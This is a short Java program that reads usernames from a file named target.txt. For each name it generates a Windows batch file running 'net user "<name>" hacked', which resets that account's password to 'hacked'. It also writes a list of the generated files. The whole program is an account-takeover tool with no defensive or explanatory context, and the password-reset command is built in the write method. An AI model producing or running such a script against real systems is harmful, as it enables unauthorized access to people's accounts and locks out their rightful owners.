import java.util.Scanner;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;

public class createBat{

public static void main(String[] args) throws IOException{makeBats();}

public static void makeBats() throws IOException{
File input=new File("target.txt");
        Scanner fscan=new Scanner(System.in);
        try{
            fscan=new Scanner(input);
        }
        catch(FileNotFoundException e){
            System.out.println(input+" cannot be found!");
        }
int i=0;
String outP="";
while(fscan.hasNext()){
	String user=fscan.nextLine();
	String s=write(user,i);
	outP+=s+"\n";
	i++;
}

	try{
            OutputStream output=new FileOutputStream("batchFs.txt");
            PrintStream printOut = new PrintStream(output);
            printOut.print(outP);
            System.setOut(printOut);
            System.out.flush();
            printOut.close();
            output.close();
        }
        catch(FileNotFoundException e){
            System.out.println("Cannot write to file.");
        }        
}

public static String write(String s, int n) throws IOException{


String removePasswd = "net user \""+s+"\" hacked";

String title="guru/t"+n+".bat";
try{
            
	    OutputStream output=new FileOutputStream(title);
            PrintStream printOut = new PrintStream(output);
            printOut.print(removePasswd);
            System.setOut(printOut);
            System.out.flush();
            printOut.close();
            output.close();
        }
        catch(FileNotFoundException e){
            System.out.println("Cannot write to file.");
        }
	return title;

}}
